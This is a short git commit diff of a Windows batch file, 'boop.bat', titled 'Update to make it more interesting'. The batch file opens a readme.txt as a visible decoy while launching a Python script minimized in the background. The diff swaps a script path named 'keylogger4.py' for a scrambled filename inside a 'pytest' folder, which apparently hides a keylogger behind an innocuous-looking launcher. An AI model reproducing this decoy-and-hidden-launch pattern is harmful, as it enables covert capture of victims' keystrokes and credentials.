7774f93d1edc83da42dc58f3fedb1efd6ff3d923
j <jgautama7@gmail.com>
2024-11-10 15:48:40 -0600

    Update to make it more interesting

--- TESTn2/zz099-qqzi1zz20629/support/boop.bat
+++ TESTn2/zz099-qqzi1zz20629/support/boop.bat
@@ -1,3 +1,3 @@
 @echo off
 start "" "C:\TESTn2\zz099-qqzi1zz20629\readme.txt"
-start /min python "C:\TESTn2\655-rezon889033\a\abin\keylogger4.py"
+start /min python "C:\TESTn2\655-rezon889033\a\abin\pytest\wtz9pls10_21Dzzntz_99327.py"
